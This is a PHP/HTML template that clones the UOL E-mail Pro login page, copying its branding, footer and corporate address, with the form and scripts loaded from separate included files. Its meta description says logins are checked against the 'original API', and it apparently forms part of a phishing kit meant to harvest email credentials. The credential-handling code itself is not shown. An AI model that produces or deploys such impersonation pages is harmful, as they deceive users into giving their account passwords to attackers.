<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="Acesse seu E-mail Pro UOL — login validado na API original mailpro.uol.com.br">
    <meta http-equiv="Cache-Control" content="no-cache, no-store">
    <title><?= e($config['site_title']) ?></title>
    <link rel="shortcut icon" href="https://mailpro.uol.com.br/favicon.ico" type="image/x-icon">
    <link href="assets/uol.css?v=2" rel="stylesheet">
</head>
<body class="uol-page">

<div class="uol-topbar"></div>

<?php if ($statusVisible): ?>
<div class="uol-notice-logout"><?= e($statusMessage) ?></div>
<?php endif; ?>

<div class="uol-wrap">
    <div class="uol-card">
        <header class="uol-header">
            <img src="assets/mailpro-logo.svg" alt="E-mail Pro UOL" class="uol-logo" width="200" height="52">
        </header>
        <section aria-label="Formulário de acesso">
            <?php require __DIR__ . '/login_form.php'; ?>
        </section>
    </div>

    <section class="uol-links">
        <a href="https://faq.uol.com.br/uolhost/content/category/uol-host/e-mail-profissional/" target="_blank" rel="noopener">Página de ajuda</a>
        <a href="https://meunegocio.uol.com.br/e-mail" target="_blank" rel="noopener" class="uol-btn-outline">Criar meu E-mail Profissional</a>
    </section>

    <footer class="uol-footer">
        © 1996 - <?= (int) $year ?> — UOL — O melhor conteúdo. Todos os direitos reservados.<br>
        UNIVERSO ONLINE S/A — Av. Brigadeiro Faria Lima, 1.384, São Paulo/SP
    </footer>
</div>

<?php require __DIR__ . '/login_scripts.php'; ?>
<script src="assets/login.js?v=2"></script>
</body>
</html>
